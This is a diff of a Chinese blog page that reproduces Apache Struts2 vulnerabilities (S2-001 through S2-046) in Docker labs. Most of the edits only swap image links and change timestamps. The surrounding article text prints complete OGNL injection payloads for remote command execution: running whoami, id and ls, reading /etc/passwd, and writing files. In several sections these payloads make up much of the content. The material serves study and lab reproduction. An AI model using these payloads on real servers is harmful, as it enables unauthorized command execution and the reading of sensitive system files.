@@ -24,7 +24,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/null">
 <meta property="article:published_time" content="2021-09-13T01:39:53.000Z">
-<meta property="article:modified_time" content="2021-12-14T07:45:04.000Z">
+<meta property="article:modified_time" content="2022-12-06T09:06:29.222Z">
 <meta property="article:author" content="zhang rui">
 <meta property="article:tag" content="Struts2漏洞复现总结">
 <meta name="twitter:card" content="summary">
@@ -191,7 +191,7 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1639467904000"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1670317589222"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
@@ -202,23 +202,23 @@
             <h1 id="Struts2漏洞复现总结"><a href="#Struts2漏洞复现总结" class="headerlink" title="Struts2漏洞复现总结"></a>Struts2漏洞复现总结</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。</p>
 <h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
 <p>进入s2-001的docker漏洞环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094253554.png" alt="image-20210913094253554"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6s6ER.png" alt="image"></p>
 <p>首先使用<code>%&#123;&#39;test&#39;&#125;</code>进行测试漏洞是否存在</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094318711.png" alt="image-20210913094318711"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6shvD.png" alt="image"></p>
 <p>返回了test，证明存在漏洞</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094331314.png" alt="image-20210913094331314"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yFP0.png" alt="image"></p>
 <p>使用payload进行测试，返回了<code>tomcatBinDir&#123;/usr/local/tomcat&#125;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094357245.png" alt="image-20210913094357245"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yA2T.png" alt="image"></p>
 <p>使用payload执行whoami</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094424154.png" alt="image-20210913094424154"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yer4.png" alt="image"></p>
 <p>使用payload执行<code>cat /etc/password</code>命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094448630.png" alt="image-20210913094448630"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yuZ9.png" alt="image"></p>
 <h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
 
@@ -226,33 +226,33 @@
 <p>S2-003 使用\u0023绕过s2对#的防御 S2-003 后官方增加了安全模式（沙盒） S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</p>
 <p>影响版本: 2.0.0 - 2.1.8.1</p>
 <p>进入s2-005的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094525912.png" alt="image-20210913094525912"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yMI1.png" alt="image"></p>
 <p>抓包添加payload执行往/tmp/目录下写入success文件的操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094546828.png" alt="image-20210913094546828"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6y1G6.png" alt="image"></p>
 <p>进入docker容器查看，在tmp目录下已经创建了success文件</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913094556021.png" alt="image-20210913094556021"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yJMD.png" alt="image"></p>
 <h1 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h1><p>在s2-007页面的文本框中，age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</p>
 <p>进入s2-007的docker漏洞环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/640" alt="图片"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/640.webp"></p>
 <p>执行payload列出当前目录下的所有文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100713003.png" alt="image-20210913100713003"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yDRf.png" alt="image"></p>
 <p>添加payload执行whoami</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100731419.png" alt="image-20210913100731419"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6y4J0.png" alt="image"></p>
 <p>也可以直接在age文本框处使用payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExe cution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100746638.png" alt="image-20210913100746638"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yTQU.png" alt="image"></p>
 <p>即可得到id</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100754777.png" alt="image-20210913100754777"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yHL4.png" alt="image"></p>
 <h1 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h1><p>s2-008漏洞产生的原因，主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入?debug=command&amp;expression=即可执行OGNL表达式</p>
 <p>进入s2-008的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100803887.png" alt="image-20210913100803887"></p>
+<p><img src="https://s1.ax1x.com/2022/12/06/z6yLw9.png" alt="image"></p>
 <p>在GET包处添加payload执行whoami</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=whoami</span><br></pre></td></tr></table></figure>
 
@@ -261,27 +261,27 @@
 <h1 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h1><p>Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p>
 <p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p>
 <p>影响版本Struts 2.1.0-2.3.1.1</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100814542.png" alt="image-20210913100814542"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100814542.png" alt="image-20210913100814542"></p>
 <p>进入S2-009的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100825357.png" alt="image-20210913100825357"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100825357.png" alt="image-20210913100825357"></p>
 <p>访问<code>192.168.1.8:8080/ajax/example5</code>，此为存在漏洞的界面</p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100835883.png" alt="image-20210913100835883"></p>
 <p>将payload拼接读取passwd文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100845719.png" alt="image-20210913100845719"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100845719.png" alt="image-20210913100845719"></p>
 <h1 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h1><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;    name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p>
 <p>进入s2-012的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100854908.png" alt="image-20210913100854908"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100854908.png" alt="image-20210913100854908"></p>
 <p>直接在文本框内执行payload读取passwd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100913358.png" alt="image-20210913100913358"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100913358.png" alt="image-20210913100913358"></p>
 <p>点击提交即可读取到passwd</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100921023.png" alt="image-20210913100921023"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100921023.png" alt="image-20210913100921023"></p>
 <h1 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h1><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
 <p>进入s2-013的docker环境</p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100930758.png" alt="image-20210913100930758"></p>
@@ -294,19 +294,19 @@
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100938927.png" alt="image-20210913100938927"></p>
 <h1 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h1><p>s2-015漏洞远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码</p>
 <p>进入s2-015的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100946380.png" alt="image-20210913100946380"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100946380.png" alt="image-20210913100946380"></p>
 <p>首先构造{1+1}得到payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$&#123;1+1&#125;.action</span><br></pre></td></tr></table></figure>
 
 <p>执行后自动编码得到如下，在message处会回显</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$%7B1+1%7D.action</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100955389.png" alt="image-20210913100955389"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100955389.png" alt="image-20210913100955389"></p>
 <p>构造payload显示id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span><br></pre></td></tr></table></figure>
 
 <p>这里在message处得到id需要进行url解码</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101003312.png" alt="image-20210913101003312"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101003312.png" alt="image-20210913101003312"></p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101010963.png" alt="image-20210913101010963"></p>
 <h1 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h1><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
 <p>进入s2-016的docker环境</p>
@@ -314,14 +314,14 @@
 <p>构造payload执行，可以发现执行过后网址后面出现了id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101026460.png" alt="image-20210913101026460"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101026460.png" alt="image-20210913101026460"></p>
 <h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。method: Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。.</p>
 <p>进入s2-032的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101033069.png" alt="image-20210913101033069"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101033069.png" alt="image-20210913101033069"></p>
 <p>构造payload返回1001060253718则代表可代码执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10010</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101109789.png" alt="image-20210913101109789"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101109789.png" alt="image-20210913101109789"></p>
 <p>构造payload输出id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure>
 
@@ -330,7 +330,7 @@
 <p>影响范围</p>
 <p>Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p>
 <p>进入s2-045的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101118720.png" alt="image-20210913101118720"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101118720.png" alt="image-20210913101118720"></p>
 <p>构造payload任意命令执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:&quot;%&#123;(#xxx=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;&quot;pwd&quot;&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
 
@@ -359,7 +359,7 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wqhicbb6RN1ZUn43bZvZibzZ6aoum8qITa2b8M5lNkpMcWgzicCruiaMg1g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/640" alt="图片"></p>
 <h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h1><p>s2-046漏洞的利用有点特殊，需要满足以下几个条件：</p>
 <p>1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：&lt;constant name =“struts.multipart.parser”value =“jakarta-stream”/&gt;</p>
 <p>2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB）</p>
@@ -367,13 +367,13 @@
 <p>如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。</p>
 <p>与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。</p>
 <p>进入s2-046的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101149107.png" alt="image-20210913101149107"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101149107.png" alt="image-20210913101149107"></p>
 <p>点击submit进行抓包，可以看到这里的filename正常情况下是为空的</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913102126904.png" alt="image-20210913102126904"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102126904.png" alt="image-20210913102126904"></p>
 <p>构造payload执行1+99</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,1+99)&#125;\x00b</span><br></pre></td></tr></table></figure>
 
